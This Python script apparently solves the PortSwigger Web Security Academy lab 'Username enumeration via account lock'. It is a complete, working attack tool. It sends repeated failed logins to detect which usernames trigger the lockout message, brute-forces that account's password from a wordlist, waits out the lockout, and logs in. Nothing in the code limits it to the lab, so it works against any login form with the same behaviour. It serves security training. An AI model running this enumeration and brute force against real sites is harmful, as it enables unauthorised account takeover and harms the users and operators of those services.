#!/usr/bin/env python3
# Lab: Username enumeration via account lock
# Lab-Link: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock
# Difficulty: PRACTITIONER

import asyncio
import sys
import urllib3
from pathlib import Path
from typing import Optional, Union

import aiohttp

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


async def send_login(session: aiohttp.ClientSession, host: str, username: str, password: str,
                     allow_redirects: bool = False) -> int:
    """Attempt to login
    Return values:
        0 on any condition not mentioned below
        1 if response is a 302 redirect
        2 if response contains the string 'Invalid username or password.'
        3 if response contains the string 'You have made too many incorrect login attempts.'
        9 if response contains the string f'Your username is: {username}'
    """
    url = f'{host}/login'
    data = {'username': username, 'password': password}

    async with session.post(url, data=data, allow_redirects=allow_redirects) as response:
        if response.status == 302:
            return 1

        text = await response.text()
        if 'Invalid username or password' in text:
            return 2
        if 'You have made too many incorrect login attempts' in text:
            return 3
        if f'Your username is: {username}' in text:
            return 9

    return 0


async def enumerate_username(session: aiohttp.ClientSession, host: str, username_file: Path) -> Optional[str]:
    async with username_file.open('r') as f:
        for line in f:
            username = line.strip()
            msg = f'[ ] Brute force username: {username}'
            print(f'{msg}{" " * (80 - len(msg))}', end='\r', flush=True)

            for _ in range(1, 5):
                if await send_login(session, host, username, 'xxx') == 3:
                    msg = f'[+] Username found: {username}'
                    print(f'{msg}{" " * (80 - len(msg))}', end='\n', flush=True)
                    return username

    msg = f'[-] Failed to brute force username'
    print(f'{msg}{" " * (80 - len(msg))}', end='\n', flush=True)
    return None


async def brute_force_password(session: aiohttp.ClientSession, host: str, username: str, password_file: Path) -> \
        Optional[str]:
    async with password_file.open('r') as f:
        for line in f:
            password = line.strip()
            msg = f'[ ] Brute force password: {password}'
            print(f'{msg}{" " * (80 - len(msg))}', end='\r', flush=True)

            res = await send_login(session, host, username, password)
            if res == 1:
                msg = f'[+] Password found: {password}'
                print(f'{msg}{" " * (80 - len(msg))}', end='\n', flush=True)
                return password

    msg = f'[-] Failed to brute force password'
    print(f'{msg}{" " * (80 - len(msg))}', end='\n', flush=True)
    return None


async def wait() -> None:
    for i in range(65, 0, -1):
        msg = f'[ ] Waiting {i} seconds to expire lockout'
        print(f'{msg}{" " * (80 - len(msg))}', end='\r', flush=True)
        await asyncio.sleep(1)
    msg = f'[+] Account lockout should be expired'
    print(f'{msg}{" " * (80 - len(msg))}', end='\n', flush=True)


async def main() -> None:
    print('[+] Lab: Username enumeration via account lock')
    try:
        host = sys.argv[1].strip().rstrip('/')
        username_file = Path(sys.argv[2].strip())
        password_file = Path(sys.argv[3].strip())
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST> <USERNAME_FILE> <PASSWORD_FILE>')
        print(f'Example: {sys.argv[0]} http://www.example.com candidate_usernames.txt candidate_passwords.txt')
        sys.exit(-1)

    async with aiohttp.ClientSession() as session:
        username = await enumerate_username(session, host, username_file)
        if not username:
            sys.exit(-2)

        password = await brute_force_password(session, host, username, password_file)
        if not password:
            sys.exit(-3)

        await wait()

        if await send_login(session, host, username, password, allow_redirects=True) == 9:
            print(f'[+] Login successful, lab solved')
        else:
            print(f'[-] Login not successful')


if __name__ == "__main__":
    asyncio.run(main())
